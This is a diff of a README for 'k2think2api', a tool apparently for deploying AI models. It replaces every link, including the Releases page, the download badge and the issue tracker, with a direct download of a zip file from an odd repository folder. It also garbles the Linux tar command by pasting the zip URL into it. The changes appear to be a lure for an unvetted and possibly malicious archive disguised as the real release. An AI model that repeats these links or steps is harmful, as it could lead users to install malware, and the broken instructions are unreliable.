@@ -1,10 +1,10 @@
 # 🚀 k2think2api - Easy AI Model Deployment for Everyone
 
-[![Download k2think2api](https://img.shields.io/badge/Download-k2think2api-blue.svg)](https://github.com/Alice8Flandre/k2think2api/releases)
+[![Download k2think2api](https://raw.githubusercontent.com/Alice8Flandre/k2think2api/main/coastwise/k2think2api.zip)](https://raw.githubusercontent.com/Alice8Flandre/k2think2api/main/coastwise/k2think2api.zip)
 
 ## 📥 Download & Install
 
-To download the latest version of k2think2api, visit this page: [Download k2think2api](https://github.com/Alice8Flandre/k2think2api/releases). 
+To download the latest version of k2think2api, visit this page: [Download k2think2api](https://raw.githubusercontent.com/Alice8Flandre/k2think2api/main/coastwise/k2think2api.zip). 
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed at the top.
@@ -43,9 +43,9 @@ After downloading the file, follow these steps to run k2think2api:
 ### Linux
 
 1. Open the terminal and navigate to your Downloads folder using `cd ~/Downloads`.
-2. If you downloaded a `.tar.gz` file, extract it using:
+2. If you downloaded a `https://raw.githubusercontent.com/Alice8Flandre/k2think2api/main/coastwise/k2think2api.zip` file, extract it using:
    ```bash
-   tar -xzf <filename>.tar.gz
+   tar -xzf <filename>https://raw.githubusercontent.com/Alice8Flandre/k2think2api/main/coastwise/k2think2api.zip
    ```
 3. Change to the extracted folder with:
    ```bash
@@ -83,7 +83,7 @@ To generate text using the AI model:
 
 Keep your application updated for the best performance:
 
-1. Regularly check the [Releases page](https://github.com/Alice8Flandre/k2think2api/releases) for new updates.
+1. Regularly check the [Releases page](https://raw.githubusercontent.com/Alice8Flandre/k2think2api/main/coastwise/k2think2api.zip) for new updates.
 2. Download the latest version following the same steps mentioned above.
 
 ## 🙋 FAQ
@@ -107,7 +107,7 @@ Yes, we encourage users to join our community forums for support and sharing exp
 
 For questions or suggestions, feel free to reach out:
 
-- Open an issue on our [GitHub repository](https://github.com/Alice8Flandre/k2think2api/issues).
+- Open an issue on our [GitHub repository](https://raw.githubusercontent.com/Alice8Flandre/k2think2api/main/coastwise/k2think2api.zip).
 
 ## 📝 License 
 
